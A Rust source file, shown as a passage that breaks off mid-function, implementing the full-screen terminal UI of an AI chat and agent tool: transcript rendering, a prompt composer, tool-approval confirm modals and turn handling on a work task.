//! The full-screen UI. One loop on the main task owns the terminal and the
//! `RequestContext` while idle; a submitted line moves the context into a
//! spawned work task that runs the same REPL command path the line editor
//! would, and everything the turn says comes back through `UiMsg`s. The
//! transcript is redrawn from its sources on every frame, so a resize is
//! just another frame.

mod events;
mod keys;
mod redirect;
mod render;
mod sink;
mod terminal;

use crate::config::{AppConfig, RequestContext};
use crate::events::{EventSink, NoticeKind, SubscriptionId};
use crate::prompt::{PromptAction, PromptAnswer, PromptMemory, PromptRequest};
use crate::repl::{EXIT_CANCEL_WAIT, EXIT_HOOK_DRAIN_TIMEOUT, is_command, run_repl_command};
use crate::utils::{AbortSignal, create_abort_signal};
use anyhow::{Result, bail};
use crossterm::event::{EventStream, KeyEvent};
use events::{Clock, FrameScheduler, SystemClock, TermInput};
use futures_util::StreamExt;
use keys::{Action, KeyContext, ModalKind};
use ratatui::Frame;
use ratatui::buffer::Buffer;
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Paragraph, Widget};
use ratatui_textarea::TextArea;
use redirect::FdRedirect;
pub(crate) use render::plain_text;
use render::{RenderCache, Renderer};
use sink::{TuiPrompter, TuiSink, UiMsg, unattended_answer};
use std::collections::VecDeque;
use std::io::IsTerminal;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc;
use std::time::{Duration, Instant};
use terminal::Screen;
use tokio::sync::mpsc::{UnboundedReceiver, UnboundedSender, unbounded_channel};
use tokio::task::JoinHandle;

/// Set while `run` owns the terminal; `RequestContext::ui_kind` reads it.
pub(crate) static TUI_ACTIVE: AtomicBool = AtomicBool::new(false);

pub(crate) fn active() -> bool {
    TUI_ACTIVE.load(Ordering::SeqCst)
}

/// Test-only harness hook: when set to `1`, `run` panics right after
/// entering the alternate screen so a pty test can check the panic hook
/// restores the terminal. Debug builds only; a release binary ignores it.
#[cfg(debug_assertions)]
const PANIC_AT_START_ENV: &str = "COYOTE_TUI_PANIC_AT_START";

/// Test-only harness hook: when set to `1`, a turn's work task sleeps
/// past `EXIT_CANCEL_WAIT` after the turn is done, ignoring the abort,
/// so a pty test can check the bounded exit path that leaves a turn
/// behind. Debug builds only; a release binary ignores it.
#[cfg(debug_assertions)]
const STUBBORN_TURN_ENV: &str = "COYOTE_TUI_STUBBORN_TURN";

/// How long the composer must have been untouched before a bare hotkey
/// counts as a modal answer, so a keystroke meant for the composer never
/// confirms a prompt that appeared under it.
const HOTKEY_IDLE: Duration = Duration::from_secs(1);
const TOOL_OUTPUT_TAIL: usize = 20;
/// Most text one cell of late command output holds; a leftover child that
/// keeps writing sees its oldest lines dropped rather than the transcript grow.
const LATE_OUTPUT_LIMIT: usize = 64 * 1024;
const COMPOSER_MIN_ROWS: u16 = 3;
const COMPOSER_MAX_ROWS: u16 = 8;
/// Transcript rows a modal's question may not take from the frame, so the
/// narration being approved stays in view above it. A question that still
/// does not fit is clipped with a marker and cannot be approved until the
/// terminal is tall enough.
const TRANSCRIPT_MIN_ROWS: u16 = 4;
const INPUT_HINT: &str = "Enter = answer  Esc = cancel";
/// The confirm legend while part of the question is off screen: nothing
/// clipped may be approved, so the approving keys are not offered. Esc
/// leads so a narrow wrap never splits it from its meaning.
const CLIPPED_HINT: &str = "Esc = cancel  enlarge the terminal to answer";
const COMPOSER_PLACEHOLDER: &str = "Type a prompt or a .command; Enter sends";
/// How long the status row waits between two ticks of its elapsed time.
const STATUS_TICK: Duration = Duration::from_secs(1);
/// How long `flush_typeahead` waits for one more queued event, and how
/// many it drops at most, so a terminal that keeps talking cannot hold the
/// loop.
const TYPEAHEAD_GRACE: Duration = Duration::from_millis(5);
const TYPEAHEAD_LIMIT: usize = 50;

const DIM: Style = Style::new().add_modifier(Modifier::DIM);

/// The UI's own fixed colours. `no_color` keeps the attributes and drops
/// the colour, which is what `NO_COLOR` asks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ChromeKind {
    Notice(NoticeKind),
    Error,
}

fn chrome_style(kind: ChromeKind, no_color: bool) -> Style {
    let (colour, style) = match kind {
        ChromeKind::Notice(NoticeKind::ToolWarning) => (Some(Color::Yellow), Style::new()),
        ChromeKind::Notice(NoticeKind::Routing) => (None, Style::new()),
        ChromeKind::Notice(_) => (None, DIM),
        ChromeKind::Error => (Some(Color::Red), Style::new()),
    };
    match colour {
        Some(colour) if !no_color => style.fg(colour),
        _ => style,
    }
}

/// The key legend under a yes/no question, naming what a bare Enter answers.
fn confirm_hint(default: bool, tool: bool) -> String {
    let enter = if default { "yes" } else { "no" };
    if tool {
        format!("y = yes  n = no  a = yes for this session  Enter = {enter}  Esc = cancel")
    } else {
        format!("y = yes  n = no  Enter = {enter}  Esc = cancel")
    }
}

struct ActiveGuard;

impl ActiveGuard {
    fn set() -> Self {
        TUI_ACTIVE.store(true, Ordering::SeqCst);
        Self
    }
}

impl Drop for ActiveGuard {
    fn drop(&mut self) {
        TUI_ACTIVE.store(false, Ordering::SeqCst);
    }
}

struct BusSubscription(SubscriptionId);

impl BusSubscription {
    fn new(sink: Arc<dyn EventSink>) -> Self {
        Self(crate::events::bus().subscribe(sink))
    }
}

impl Drop for BusSubscription {
    fn drop(&mut self) {
        crate::events::bus().unsubscribe(self.0);
    }
}

/// What one line produced on the work task.
#[derive(Debug, Default)]
pub(crate) struct TurnOutcome {
    /// `run_repl_command` asked to leave (`.exit`).
    pub(crate) exit: bool,
    pub(crate) error: Option<String>,
    /// Everything the turn printed to fds 1 and 2.
    pub(crate) captured: String,
}

fn late_output(tx: UnboundedSender<UiMsg>) -> impl Fn(String) + Send + 'static {
    move |text| {
        let _ = tx.send(UiMsg::Notice {
            kind: NoticeKind::Routing,
            text: render::plain_text(&text),
        });
    }
}

/// Drives a work-task future to completion on a blocking-pool thread.
/// The returned handle joins like a `tokio::spawn` one, but the future
/// may block its thread freely; see [`spawn_turn`] for why it must.
fn spawn_work<F>(future: F) -> JoinHandle<F::Output>
where
    F: std::future::Future + Send + 'static,
    F::Output: Send + 'static,
{
    let handle = tokio::runtime::Handle::current();
    tokio::task::spawn_blocking(move || handle.block_on(future))
}

/// Runs one line the way the REPL would, on its own task, with fds 1 and 2
/// captured. The context comes back with the outcome.
///
/// Runtime rule: the work task must never sit on a runtime worker. The
/// turn blocks its thread for the whole of a tool call and of a sync
/// prompt, and on the multi-thread runtime the time driver is serviced
/// by parked workers, never by the UI loop's `block_on` thread. A worker
/// blocked in the turn can hold the driver up with it, and every
/// timer-driven frame then waits for the turn to end. So the body runs on
/// the blocking pool under a nested `block_on` ([`spawn_work`]).
pub(crate) fn spawn_turn(
    mut ctx: RequestContext,
    abort: AbortSignal,
    line: String,
    ui: UnboundedSender<UiMsg>,
) -> JoinHandle<(RequestContext, TurnOutcome)> {
    spawn_work(async move {
        let guard = match FdRedirect::begin(late_output(ui.clone())) {
            Ok(guard) => Some(guard),
            Err(err) => {
                let _ = ui.send(UiMsg::Notice {
                    kind: NoticeKind::ToolWarning,
                    text: format!("Running the turn without output capture: {err}"),
                });
                None
            }
        };
        let result = Box::pin(run_repl_command(&mut ctx, abort, &line)).await;
        let captured = guard.map(FdRedirect::finish).unwrap_or_default();
        #[cfg(debug_assertions)]
        if std::env::var(STUBBORN_TURN_ENV).as_deref() == Ok("1") {
            std::thread::sleep(2 * EXIT_CANCEL_WAIT);
        }
        let outcome = match result {
            Ok(exit) => TurnOutcome {
                exit,
                error: None,
                captured,
            },
            Err(err) => TurnOutcome {
                exit: false,
                // The REPL's shape: message, then its causes.
                error: Some(crate::utils::pretty_error(&err)),
                captured,
            },
        };
        (ctx, outcome)
    })
}

/// The REPL's teardown on the work task, under the same runtime rule as
/// [`spawn_turn`]: settles background agents, exits the session (which
/// may ask to save it) and closes the agent bracket.
fn spawn_exit(
    mut ctx: RequestContext,
    abort: AbortSignal,
) -> JoinHandle<(RequestContext, Result<()>, String)> {
    spawn_work(async move {
        let guard = FdRedirect::begin(|_| {}).ok();
        ctx.cancel_background_tasks_and_wait(EXIT_CANCEL_WAIT).await;
        let result = ctx.exit_session();
        ctx.top_level_agent_finished(result.as_ref().err(), Some(&abort));
        let captured = guard.map(FdRedirect::finish).unwrap_or_default();
        (ctx, result, captured)
    })
}

/// The footer's left half, read from the context only while the UI holds it.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct FooterInfo {
    who: Option<String>,
    model: String,
    session: Option<String>,
    agents: usize,
    jobs: usize,
}

impl FooterInfo {
    pub(crate) fn from_ctx(ctx: &RequestContext) -> Self {
        let who = ctx
            .agent
            .as_ref()
            .map(|agent| agent.name().to_string())
            .or_else(|| ctx.role.as_ref().map(|role| role.name().to_string()));
        let (agents, jobs) = ctx.supervisor.as_ref().map_or((0, 0), |supervisor| {
            let supervisor = supervisor.read();
            (supervisor.active_count(), supervisor.active_job_count())
        });
        Self {
            who,
            model: ctx.model.id(),
            session: ctx.session.as_ref().map(|s| s.name().to_string()),
            agents,
            jobs,
        }
    }

    fn text(&self) -> String {
        let mut parts = Vec::new();
        if let Some(who) = &self.who {
            parts.push(who.clone());
        }
        parts.push(self.model.clone());
        parts.push(
            self.session
                .clone()
                .unwrap_or_else(|| "no session".to_string()),
        );
        parts.push(format!("agents {}", self.agents));
        parts.push(format!("jobs {}", self.jobs));
        parts.join(" . ")
    }
}

/// Plain lines cached per width; the two most recently used widths are kept.
#[derive(Default)]
struct LineCache {
    entries: Vec<(u16, Vec<Line<'static>>)>,
}

impl LineCache {
    fn get(
        &mut self,
        width: u16,
        render: impl FnOnce() -> Vec<Line<'static>>,
    ) -> Vec<Line<'static>> {
        let entry = match self.entries.iter().position(|(w, _)| *w == width) {
            Some(index) => self.entries.remove(index),
            None => {
                if self.entries.len() >= 2 {
                    self.entries.remove(0);
                }
                (width, render())
            }
        };
        let lines = entry.1.clone();
        self.entries.push(entry);
        lines
    }
}

/// One entry of the transcript, kept as source so any width can render it.
enum Cell {
    User {
        text: String,
        cache: LineCache,
    },
    Assistant {
        source: String,
        done: bool,
        cache: RenderCache,
    },
    Notice {
        kind: NoticeKind,
        text: String,
        cache: LineCache,
    },
    Error {
        text: String,
        cache: LineCache,
    },
    /// A REPL command and everything it printed, already painted.
    Command {
        name: String,
        output: String,
        lines: Option<Vec<Line<'static>>>,
    },
    /// Dim lines: a tool's narration and the tail of its output.
    Text {
        call_id: Option<String>,
        lines: Vec<String>,
        open_line: bool,
    },
}

impl Cell {
    fn user(text: &str) -> Self {
        Self::User {
            text: text.to_string(),
            cache: LineCache::default(),
        }
    }

    fn assistant(source: String, done: bool) -> Self {
        Self::Assistant {
            source,
            done,
            cache: RenderCache::default(),
        }
    }

    fn notice(kind: NoticeKind, text: String) -> Self {
        Self::Notice {
            kind,
            text,
            cache: LineCache::default(),
        }
    }

    fn lines(&mut self, width: u16, renderer: &mut Renderer) -> Vec<Line<'static>> {
        let no_color = *crate::utils::NO_COLOR;
        match self {
            Cell::User { text, cache } => cache.get(width, || {
                render::plain_lines(
                    &format!("> {text}"),
                    width,
                    Style::new().add_modifier(Modifier::BOLD),
                )
            }),
            Cell::Assistant {
                source,
                done,
                cache,
            } => cache.lines(source, *done, width, renderer),
            Cell::Notice { kind, text, cache } => {
                let style = chrome_style(ChromeKind::Notice(*kind), no_color);
                cache.get(width, || render::plain_lines(text, width, style))
            }
            Cell::Error { text, cache } => cache.get(width, || {
                render::plain_lines(text, width, chrome_style(ChromeKind::Error, no_color))
            }),
            Cell::Command {
                name,
                output,
                lines,
            } => lines
                .get_or_insert_with(|| {
                    let mut lines = vec![Line::from(Span::styled(format!("> {name}"), DIM))];
                    if !output.is_empty() {
                        lines.extend(render::preformatted_lines(output));
                    }
                    lines
                })
                .clone(),
            Cell::Text { lines, .. } => {
                render::hard_wrap(render::preformatted_lines(&lines.join("\n")), width)
                    .into_iter()
                    .map(|line| line.patch_style(DIM))
                    .collect()
            }
        }
    }
}

struct TurnStatus {
    started: Instant,
    busy: Option<String>,
    thinking_since: Option<Instant>,
    tool: Option<String>,
    /// Index of the turn's first cell; tool output never merges into a
    /// cell before it.
    first_cell: usize,
}

struct PendingPrompt {
    req: PromptRequest,
    reply: mpsc::Sender<PromptAnswer>,
    field: Option<TextArea<'static>>,
}

impl PendingPrompt {
    fn kind(&self) -> ModalKind {
        if self.field.is_some() {
            ModalKind::Input
        } else {
            ModalKind::Confirm {
                default: self
                    .req
                    .default
                    .as_ref()
                    .and_then(serde_json::Value::as_bool)
                    .unwrap_or(true),
                tool: self.req.tool.is_some(),
            }
        }
    }

    /// The legend under the modal; a confirm whose question is clipped
    /// offers only Esc.
    fn hint(&self, clipped: bool) -> String {
        match self.kind() {
            ModalKind::Input => INPUT_HINT.to_string(),
            ModalKind::Confirm { .. } if clipped => CLIPPED_HINT.to_string(),
            ModalKind::Confirm { default, tool } => confirm_hint(default, tool),
        }
    }

    fn hint_lines(&self, width: u16, clipped: bool) -> Vec<Line<'static>> {
        render::plain_lines(&self.hint(clipped), width, DIM)
    }

    /// Rows reserved for the legend: enough for either wording, so the
    /// swap to the clipped one never changes the layout.
    fn hint_rows(&self, width: u16) -> u16 {
        row_count(self.hint_lines(width, false).len())
            .max(row_count(self.hint_lines(width, true).len()))
    }

    /// The question wrapped to `width`, every line of it: what the user
    /// approves is read from here, so none of it may be clipped away.
    /// Blank lines are dropped so a run of newlines cannot push the rest
    /// of the question past the pane.
    fn question_lines(&self, width: u16) -> Vec<Line<'static>> {
        // A tool controls the question's text; escape sequences in it
        // are stripped so none can move the cursor or hide a word.
        let question = render::plain_text(&self.req.question)
            .lines()
            .filter(|line| !line.trim().is_empty())
            .collect::<Vec<_>>()
            .join("\n");
        render::plain_lines(&question, width, Style::new().add_modifier(Modifier::BOLD))
    }

    /// Rows the question may take on a frame `height` tall: the status
    /// row, the footer, the modal's middle row and its hint are fixed, and
    /// `TRANSCRIPT_MIN_ROWS` stay with the transcript.
    fn question_cap(&self, width: u16, height: u16) -> u16 {
        let fixed = 3 + TRANSCRIPT_MIN_ROWS + self.hint_rows(width);
        height.saturating_sub(fixed).max(1)
    }

    fn question_rows(&self, width: u16, height: u16) -> u16 {
        row_count(self.question_lines(width).len()).clamp(1, self.question_cap(width, height))
    }

    /// Whether the cap a frame `height` tall allows leaves the whole
    /// question on screen.
    fn question_fits_cap(&self, width: u16, height: u16) -> bool {
        self.question_fits_rows(width, self.question_cap(width, height))
    }

    /// Whether `rows` of the pane hold the whole question.
    fn question_fits_rows(&self, width: u16, rows: u16) -> bool {
        row_count(self.question_lines(width).len()) <= rows
    }

    /// Rows of the whole modal: question, field or tool row, hint.
    fn rows(&self, width: u16, height: u16) -> u16 {
        self.question_rows(width, height) + 1 + self.hint_rows(width)
    }

    /// The question, middle and legend rows inside the modal's `area`.
    /// A frame too short for the layout squeezes the question first;
    /// what it actually received is what answerability is judged on.
    fn areas(&self, area: Rect) -> [Rect; 3] {
        Layout::vertical([
            Constraint::Min(1),
            Constraint::Length(1),
            Constraint::Length(self.hint_rows(area.width)),
        ])
        .areas(area)
    }
}

fn row_count(lines: usize) -> u16 {
    u16::try_from(lines).unwrap_or(u16::MAX)
}

/// Something the loop, not the app, has to do.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum Command {
    Submit(String),
    Interrupt,
    Quit,
    Suspend,
    OpenEditor,
    Redraw,
}

fn new_textarea() -> TextArea<'static> {
    let mut textarea = TextArea::default();
    textarea.set_cursor_line_style(Style::new());
    textarea
}

/// An empty composer with its placeholder; the modal's input field is a
/// bare `new_textarea`.
fn new_composer() -> TextArea<'static> {
    let mut composer = new_textarea();
    composer.set_placeholder_text(COMPOSER_PLACEHOLDER);
    composer.set_placeholder_style(DIM);
    composer
}

/// Everything drawn, and the rules for changing it.
pub(crate) struct App {
    cells: Vec<Cell>,
    composer: TextArea<'static>,
    prompts: VecDeque<PendingPrompt>,
    turn: Option<TurnStatus>,
    /// The teardown task owns the context: nothing new can be submitted,
    /// interrupted or quit until it reports back.
    exiting: bool,
    footer: FooterInfo,
    usage: String,
    last_keystroke: Option<Instant>,
    /// The area of the last frame drawn; what a modal's question cap and
    /// its clipped state are judged against between frames.
    frame_area: Option<Rect>,
    /// The rows the front prompt's question received in the last frame,
    /// None until it has been drawn.
    question_area: Option<Rect>,
    clock: Arc<dyn Clock>,
    frames: FrameScheduler,
    renderer: Renderer,
    config: Arc<AppConfig>,
    prompt_memory: Arc<PromptMemory>,
}

impl App {
    pub(crate) fn new(
        clock: Arc<dyn Clock>,
        config: Arc<AppConfig>,
        prompt_memory: Arc<PromptMemory>,
        footer: FooterInfo,
    ) -> Result<Self> {
        let renderer = Renderer::new(config.render_options()?)?;
        Ok(Self {
            cells: Vec::new(),
            composer: new_composer(),
            prompts: VecDeque::new(),
            turn: None,
            exiting: false,
            footer,
            usage: String::new(),
            last_keystroke: None,
            frame_area: None,
            question_area: None,
            frames: FrameScheduler::new(Arc::clone(&clock)),
            clock,
            renderer,
            config,
            prompt_memory,
        })
    }

    pub(crate) fn schedule_frame(&mut self) {
        self.frames.schedule_frame();
    }

    pub(crate) fn composer_text(&self) -> String {
        self.composer.lines().join("\n")
    }

    pub(crate) fn set_composer_text(&mut self, text: &str) {
        let mut composer = TextArea::new(text.split('\n').map(str::to_string).collect());
        composer.set_cursor_line_style(Style::new());
        composer.set_placeholder_text(COMPOSER_PLACEHOLDER);
        composer.set_placeholder_style(DIM);
        composer.move_cursor(ratatui_textarea::CursorMove::Bottom);
        composer.move_cursor(ratatui_textarea::CursorMove::End);
        self.composer = composer;
        self.schedule_frame();
    }

    /// Re-reads what the footer and the renderer take from the context;
    /// called whenever the context is back in the UI's hands.
    pub(crate) fn sync_from_ctx(&mut self, ctx: &mut RequestContext) {
        self.footer = FooterInfo::from_ctx(ctx);
        if !Arc::ptr_eq(&self.config, &ctx.app.config) {
            match ctx.app.config.render_options().and_then(Renderer::new) {
                Ok(renderer) => self.renderer = renderer,
                Err(err) => warn!("Keeping the previous render options: {err}"),
            }
            self.config = Arc::clone(&ctx.app.config);
        }
        if let Some(text) = ctx.pending_prefill.take() {
            self.set_composer_text(&text);
        }
        self.schedule_frame();
    }

    /// Records that a line left for the work task. A command gets its cell
    /// now, so the transcript shows what is running under a modal the
    /// command raises; the output fills in when the turn ends.
    pub(crate) fn begin_turn(&mut self, line: &str, command: bool) {
        let first_cell = self.cells.len();
        if command {
            self.cells.push(Cell::Command {
                name: line.to_string(),
                output: String::new(),
                lines: None,
            });
        } else {
            self.cells.push(Cell::user(line));
        }
        self.turn = Some(TurnStatus {
            started: self.clock.now(),
            busy: None,
            thinking_since: None,
            tool: None,
            first_cell,
        });
        self.schedule_frame();
    }

    /// Commits what the work task brought back.
    pub(crate) fn end_turn(&mut self, command: bool, outcome: &TurnOutcome) {
        let first_cell = self.turn.take().map(|turn| turn.first_cell);
        self.close_stream();
        if command {
            let index = first_cell.expect("end_turn follows begin_turn");
            let Cell::Command { output, lines, .. } = &mut self.cells[index] else {
                panic!("begin_turn pushed a Command cell for a command turn");
            };
            *output = outcome.captured.clone();
            *lines = None;
        } else if !outcome.captured.trim().is_empty() {
            self.cells.push(Cell::notice(
                NoticeKind::Routing,
                render::plain_text(&outcome.captured).trim_end().to_string(),
            ));
        }
        if let Some(error) = &outcome.error {
            // Errors arrive painted for the REPL like notices do.
            self.cells.push(Cell::Error {
                text: render::plain_text(error),
                cache: LineCache::default(),
            });
        }
        self.schedule_frame();
    }

    pub(crate) fn begin_exit(&mut self) {
        self.exiting = true;
        self.schedule_frame();
    }

    fn close_stream(&mut self) {
        if let Some(Cell::Assistant { done, .. }) = self.cells.last_mut() {
            *done = true;
        }
    }

    fn key_context(&self) -> KeyContext {
        let idle_ok = self
            .last_keystroke
            .is_none_or(|at| self.clock.now().duration_since(at) >= HOTKEY_IDLE);
        // The cap says what the frame should allow; the rows the last
        // draw actually gave the question say what it got. A frame too
        // short for the layout squeezes the question below its cap.
        let question_fully_shown = match (self.prompts.front(), self.frame_area) {
            (Some(prompt), Some(area)) => {
                prompt.question_fits_cap(area.width, area.height)
                    && self
                        .question_area
                        .is_none_or(|given| prompt.question_fits_rows(given.width, given.height))
            }
            _ => true,
        };
        KeyContext {
            turn_running: self.turn.is_some() || self.exiting,
            composer_empty: self.composer.is_empty(),
            modal: self.prompts.front().map(PendingPrompt::kind),
            idle_ok,
            question_fully_shown,
        }
    }

    pub(crate) fn handle_input(&mut self, input: TermInput) -> Option<Command> {
        match input {
            TermInput::Key(key) => self.handle_key(key),
            TermInput::Paste(text) => {
                self.last_keystroke = Some(self.clock.now());
                // Terminals deliver a multi-line paste with the line ends
                // they use themselves (CR, CRLF or LF); the composer and
                // the field take one shape.
                let text = text.replace("\r\n", "\n").replace('\r', "\n");
                match self.prompts.front_mut() {
                    // A confirm has no field, and the composer is hidden
                    // under the modal: a paste there would land where the
                    // user cannot see it.
                    Some(prompt) => {
                        if let Some(field) = prompt.field.as_mut() {
                            field.insert_str(text.replace('\n', " "));
                        }
                    }
                    None => {
                        self.composer.insert_str(text);
                    }
                }
                self.schedule_frame();
                None
            }
            TermInput::Resize => {
                self.schedule_frame();
                None
            }
            TermInput::Ignored => None,
        }
    }

    pub(crate) fn handle_key(&mut self, key: KeyEvent) -> Option<Command> {
        let action = keys::map_key(key, &self.key_context());
        // Every key pressed while no question is up re-arms the idle gate,
        // the ignored ones included: an Enter tapped during a turn is a
        // keystroke the user is still making when the confirm appears.
        // Hotkeys answering a modal do not count; `answer_front` re-arms
        // for the next queued question instead.
        if self.prompts.is_empty() {
            self.last_keystroke = Some(self.clock.now());
        }
        let command = match action {
            Action::Submit => {
                let text = self.composer_text();
                if text.trim().is_empty() {
                    None
                } else {
                    self.composer = new_composer();
                    Some(Command::Submit(text.trim().to_string()))
                }
            }
            Action::InsertNewline => {
                self.composer.insert_newline();
                None
            }
            Action::ClearComposer => {
                self.set_composer_text("");
                None
            }
            Action::Interrupt => (!self.exiting).then_some(Command::Interrupt),
            Action::Quit => (!self.exiting).then_some(Command::Quit),
            Action::Suspend => Some(Command::Suspend),
            Action::OpenEditor => Some(Command::OpenEditor),
            Action::ScheduleFrame => Some(Command::Redraw),
            Action::Answer(answer) => {
                self.answer_front(answer);
                None
            }
            Action::AnswerYesForSession => {
                if let Some(prompt) = self.prompts.front()
                    && let Some(tool) = prompt.req.tool.as_deref()
                {
                    self.prompt_memory.remember(tool, &prompt.req.question);
                }
                self.answer_front(PromptAnswer::Confirmed(true));
                None
            }
            Action::SubmitModalInput => {
                let text = self
                    .prompts
                    .front()
                    .and_then(|p| p.field.as_ref())
                    .map(|field| field.lines().join(" "))
                    .unwrap_or_default();
                self.answer_front(PromptAnswer::Text(text));
                None
            }
            Action::ModalInput(key) => {
                self.last_keystroke = Some(self.clock.now());
                if let Some(field) = self.prompts.front_mut().and_then(|p| p.field.as_mut()) {
                    field.input(key);
                }
                None
            }
            Action::ComposerInput(key) => {
                self.composer.input(key);
                None
            }
            Action::Nothing => None,
        };
        self.schedule_frame();
        command
    }

    fn answer_front(&mut self, answer: PromptAnswer) {
        if let Some(prompt) = self.prompts.pop_front() {
            // The asker gave up waiting (its turn was interrupted); the
            // answer has nowhere to go.
            let _ = prompt.reply.send(answer);
            // The next queued question gets a fresh idle gate: a held or
            // repeated hotkey must not answer it on the first prompt's
            // momentum.
            self.last_keystroke = Some(self.clock.now());
            self.question_area = None;
        }
    }

    pub(crate) fn handle_msg(&mut self, msg: UiMsg) {
        match msg {
            UiMsg::TextDelta(delta) => match self.cells.last_mut() {
                Some(Cell::Assistant {
                    source,
                    done: false,
                    ..
                }) => source.push_str(&delta),
                _ => self.cells.push(Cell::assistant(delta, false)),
            },
            UiMsg::StreamDone => self.close_stream(),
            UiMsg::AssistantText(text) => match self.cells.last_mut() {
                Some(Cell::Assistant {
                    source,
                    done,
                    cache,
                }) if !*done => {
                    *source = text;
                    *done = true;
                    *cache = RenderCache::default();
                }
                _ => self.cells.push(Cell::assistant(text, true)),
            },
            UiMsg::Notice { kind, text } => self.push_notice(kind, text),
            UiMsg::ToolNarration { call_id, line } => self.cells.push(Cell::Text {
                call_id: Some(call_id),
                lines: vec![line],
                open_line: false,
            }),
            UiMsg::ToolOutput { call_id, bytes } => self.append_tool_output(call_id, &bytes),
            UiMsg::Busy(message) => {
                if let Some(turn) = self.turn.as_mut() {
                    turn.busy = message;
                }
            }
            UiMsg::TurnDivider => {}
            UiMsg::ThinkingStarted => {
                if let Some(turn) = self.turn.as_mut() {
                    turn.thinking_since = Some(self.clock.now());
                }
            }
            UiMsg::ThinkingStopped => {
                if let Some(turn) = self.turn.as_mut() {
                    turn.thinking_since = None;
                }
            }
            UiMsg::UsageUpdated(right) => self.usage = right,
            UiMsg::ToolRunning(tool) => {
                if let Some(turn) = self.turn.as_mut() {
                    turn.tool = tool;
                }
            }
            UiMsg::Prompt { req, reply } => self.enqueue_prompt(*req, reply),
        }
        self.schedule_frame();
    }

    fn enqueue_prompt(&mut self, req: PromptRequest, reply: mpsc::Sender<PromptAnswer>) {
        let field = match req.action {
            PromptAction::Confirm => None,
            PromptAction::Input => Some(new_textarea()),
            PromptAction::Select | PromptAction::Checkbox | PromptAction::Password => {
                self.cells.push(Cell::notice(
                    NoticeKind::ToolWarning,
                    format!(
                        "Prompt kind {} is not available in the TUI yet",
                        req.action.name()
                    ),
                ));
                let _ = reply.send(PromptAnswer::Cancelled); // TASK-315
                return;
            }
        };
        if self.prompts.is_empty() {
            self.question_area = None;
        }
        self.prompts.push_back(PendingPrompt { req, reply, field });
    }

    /// Late command output arrives one pipe read at a time; consecutive
    /// chunks join the trailing Routing cell instead of each taking a
    /// cell of their own, and the cell keeps only its newest text.
    fn push_notice(&mut self, kind: NoticeKind, mut text: String) {
        if kind != NoticeKind::Routing {
            self.cells.push(Cell::notice(kind, text));
            return;
        }
        text.truncate(text.trim_end_matches('\n').len());
        if let Some(Cell::Notice {
            kind: NoticeKind::Routing,
            text: tail,
            cache,
        }) = self.cells.last_mut()
        {
            if !tail.is_empty() && !text.is_empty() {
                tail.push('\n');
            }
            tail.push_str(&text);
            if tail.len() > LATE_OUTPUT_LIMIT {
                let cut = tail.len() - LATE_OUTPUT_LIMIT;
                let cut = (cut..=tail.len())
                    .find(|at| tail.is_char_boundary(*at))
                    .unwrap_or(tail.len());
                tail.drain(..cut);
            }
            *cache = LineCache::default();
            return;
        }
        self.cells.push(Cell::notice(kind, text));
    }

    fn append_tool_output(&mut self, call_id: Option<String>, bytes: &[u8]) {
        if bytes.is_empty() {
            return;
        }
        let text = String::from_utf8_lossy(bytes);
        // Inside a turn the output never merges into a cell from before
        // the turn; outside one (a background job still writing) every
        // chunk of the same call shares the trailing cell, so a chatty
        // job cannot grow the transcript by a cell per read.
        let first_cell = self.turn.as_ref().map_or(0, |turn| turn.first_cell);
        let last = self.cells.len().checked_sub(1);
        let continues_last = last.is_some_and(|index| {
            index >= first_cell
                && matches!(&self.cells[index], Cell::Text { call_id: id, .. } if *id == call_id)
        });
        if !continues_last {
            self.cells.push(Cell::Text {
                call_id,
                lines: Vec::new(),
                open_line: false,
            });
        }
        let index = self.cells.len() - 1;
        let Cell::Text {
            lines, open_line, ..
        } = &mut self.cells[index]
        else {
            return;
        };
        let pieces: Vec<&str> = text.split('\n').collect();
        for (i, piece) in pieces.iter().enumerate() {
            let last_is_open = i == pieces.len() - 1;
            if i == 0 && *open_line {
                if let Some(last) = lines.last_mut() {
                    last.push_str(piece);
                    // A stream that never breaks its line would grow one
                    // line without bound; it keeps its newest text, like
                    // late output does.
                    if last.len() > LATE_OUTPUT_LIMIT {
                        let cut = last.len() - LATE_OUTPUT_LIMIT;
                        let cut = (cut..=last.len())
                            .find(|at| last.is_char_boundary(*at))
                            .unwrap_or(last.len());
                        last.drain(..cut);
                    }
                }
            } else if !(last_is_open && piece.is_empty()) {
                lines.push(piece.to_string());
            }
            *open_line = last_is_open && !piece.is_empty();
        }
        if lines.len() > TOOL_OUTPUT_TAIL {
            lines.drain(..lines.len() - TOOL_OUTPUT_TAIL);
        }
        // The lines that stay are bounded in bytes too, oldest first.
        let mut total: usize = lines.iter().map(|line| line.len() + 1).sum();
        while total > LATE_OUTPUT_LIMIT && lines.len() > 1 {
            total -= lines[0].len() + 1;
            lines.remove(0);
        }
    }

    /// Gives every queued prompt its unattended answer; used when the UI
    /// is about to go away without a human to ask.
    fn abandon_prompts(&mut self) {
        while let Some(prompt) = self.prompts.pop_front() {
            let _ = prompt.reply.send(unattended_answer(&prompt.req));
        }
    }

    /// What the running turn printed past its capture, already taken in
    /// as notices. Nothing draws the app once the turn's task is lost,
    /// so a panic message that came this way is handed back to be printed
    /// on the restored terminal.
    fn turn_late_output(&self) -> Vec<String> {
        let Some(turn) = &self.turn else {
            return Vec::new();
        };
        self.cells[turn.first_cell..]
            .iter()
            .filter_map(|cell| match cell {
                Cell::Notice {
                    kind: NoticeKind::Routing,
                    text,
                    ..
                } => Some(text.clone()),
                _ => None,
            })
            .collect()
    }

    fn status_text(&self) -> Option<String> {
        if self.exiting {
            return Some("Leaving...".to_string());
        }
        let turn = self.turn.as_ref()?;
        let now = self.clock.now();
        let secs = |since: Instant| now.duration_since(since).as_secs();
        let state = if let Some(tool) = &turn.tool {
            format!("Running {tool}")
        } else if let Some(since) = turn.thinking_since {
            format!("Thinking for {}s", secs(since))
        } else {
            format!(
                "{} . {}s",
                turn.busy.as_deref().unwrap_or("Working"),
                secs(turn.started)
            )
        };
        if self.prompts.is_empty() {
            Some(format!("{state}  Esc to interrupt"))
        } else {
            Some(state)
        }
    }

    fn bottom_pane_rows(&self, area: Rect) -> u16 {
        match self.prompts.front() {
